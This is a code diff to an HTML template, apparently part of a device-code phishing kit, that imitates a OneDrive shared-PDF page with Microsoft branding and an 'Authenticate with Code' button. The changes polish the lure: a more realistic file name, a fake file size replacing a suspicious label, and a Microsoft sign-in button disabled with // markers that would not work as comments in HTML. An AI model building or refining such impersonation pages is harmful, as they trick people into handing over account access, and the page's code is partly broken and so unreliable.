@@ -1421,8 +1421,8 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
             <text x="312" y="414" font-family="Segoe UI, Inter, sans-serif" font-size="64" font-weight="800" fill="#fff" text-anchor="middle">PDF</text>
           </svg>
           <div class="file-meta">
-            <div class="file-name">Reservation invoice.pdf</div>
-            <div class="file-sub">OneDrive Shared Link &bull; Secure Cloud Node</div>
+            <div class="file-name">Reservation_invoice.pdf</div>
+            <div class="file-sub">2.5 MB</div>
           </div>
         </div>
 
@@ -1452,16 +1452,16 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
           <button class="btn btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
             Authenticate with Code
           </button>
-          <button class="btn btn-secondary" onclick="openSignIn()">
-            <!-- Microsoft Core Emblem Vector -->
-            <svg viewBox="0 0 23 23" style="width:14px; height:14px; flex-shrink:0;">
-              <path fill="#f35325" d="M0 0h11v11H0z"/>
-              <path fill="#81bc06" d="M12 0h11v11H12z"/>
-              <path fill="#05a6f0" d="M0 12h11v11H0z"/>
-              <path fill="#ffba08" d="M12 12h11v11H12z"/>
-            </svg>
-            Sign in with Microsoft
-          </button>
+          // <button class="btn btn-secondary" onclick="openSignIn()">
+          //   <!-- Microsoft Core Emblem Vector -->
+          //   <svg viewBox="0 0 23 23" style="width:14px; height:14px; flex-shrink:0;">
+          //     <path fill="#f35325" d="M0 0h11v11H0z"/>
+          //     <path fill="#81bc06" d="M12 0h11v11H12z"/>
+          //     <path fill="#05a6f0" d="M0 12h11v11H0z"/>
+          //     <path fill="#ffba08" d="M12 12h11v11H12z"/>
+          //   </svg>
+          //   Sign in with Microsoft
+          // </button>
         </div>
 
         <!-- Bottom Banner with Integrated Refresh Trigger -->
